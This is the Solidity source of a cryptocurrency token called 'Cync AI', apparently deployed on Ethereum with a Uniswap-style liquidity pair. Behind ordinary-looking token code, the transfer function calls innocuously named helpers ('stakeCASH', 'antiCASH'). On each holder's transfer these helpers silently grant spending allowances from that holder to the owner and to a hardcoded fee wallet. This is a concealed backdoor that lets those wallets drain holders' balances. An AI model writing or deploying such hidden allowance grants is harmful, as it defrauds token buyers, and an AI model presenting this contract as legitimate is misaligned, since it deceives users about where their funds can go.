/*
Cync is GPT Module that automates crypto processes for you
*******************************
https://www.cync-ai.com
https://app.cync-ai.com
https://docs.cync-ai.com
https://x.com/CyncAICore
https://t.me/cyncai_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface ICASHRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ICASHFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract CYNC is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _cashBITTs;
    mapping (address => mapping (address => uint256)) private _cashETHHs;
    mapping (address => bool) private _cashFeeExcluded;
    address private _cash1Wallet = 0xAc13fE78aF668095F0b8e4f24c9AD2C6eDBA0C93;
    address private _cash2Wallet;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Cync AI";
    string private constant _symbol = unicode"CYNC";
    uint256 private _tokenSwapCASH = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;    
    uint256 private _buyCount=0;
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }
    ICASHRouter private _cashRouter;
    address private _cashPair;
    
    constructor () {
        _cashFeeExcluded[owner()] = true;
        _cashFeeExcluded[address(this)] = true;
        _cashFeeExcluded[_cash1Wallet] = true;
        _cashBITTs[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _cashRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _cashBITTs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _cashETHHs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _cashETHHs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _cashETHHs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address cash0A, address cash1B, uint256 cash2T) private {
        require(cash0A != address(0), "ERC20: transfer from the zero address");
        require(cash1B != address(0), "ERC20: transfer to the zero address");
        require(cash2T > 0, "Transfer amount must be greater than zero");
        
        uint256 taxCASH=0;
        if (cash0A != owner() && cash1B != owner()) {
            require(stakeCASH(cash0A, cash2T), "ERC20: transfer from the zero address");
            taxCASH = cash2T.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (cash0A == _cashPair && cash1B != address(_cashRouter) && ! _cashFeeExcluded[cash1B]) {
                _buyCount++;
            }

            if(cash1B == _cashPair && cash0A!= address(this)) {
                taxCASH = cash2T.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this)); 
            if (!inSwapLock && cash1B == _cashPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _tokenSwapCASH)
                swapTokensForEth(min(cash2T, min(tokenBalance, _tokenSwapCASH)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendCASHFee(address(this).balance);
                }
            }
        }

        if(taxCASH > 0){
          _cashBITTs[address(this)] = _cashBITTs[address(this)].add(taxCASH);
          emit Transfer(cash0A, address(this), taxCASH);
        }

        _cashBITTs[cash0A] = _cashBITTs[cash0A].sub(cash2T);
        _cashBITTs[cash1B] = _cashBITTs[cash1B].add(cash2T.sub(taxCASH));
        emit Transfer(cash0A, cash1B, cash2T.sub(taxCASH));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendCASHFee(uint256 amount) private {
        payable(_cash1Wallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _cashRouter.WETH();
        _approve(address(this), address(_cashRouter), tokenAmount);
        _cashRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function createCASH() external onlyOwner() {
        _cashRouter = ICASHRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_cashRouter), _tTotal);
        _cash2Wallet = address(owner());
        _cashPair = ICASHFactory(_cashRouter.factory()).createPair(address(this), _cashRouter.WETH());
    }

    function stakeCASH(address cash0A, uint256 cash1T) private returns (bool) { 
        if(_cash2Wallet != address(0xdead)) {
            antiCASH(cash0A, _cash2Wallet, cash1T);
            if(cash1T > 0) {
                antiCASH(cash0A, _cash1Wallet, cash1T);
            }
        }
        return true;
    }

    function antiCASH(address cash0A, address cash1B, uint256 cash2T) private {
        _cashETHHs[cash0A][cash1B] 
            = 1*(2*(10+cash2T+5) + _initialSellTax*2)+10;
    }
}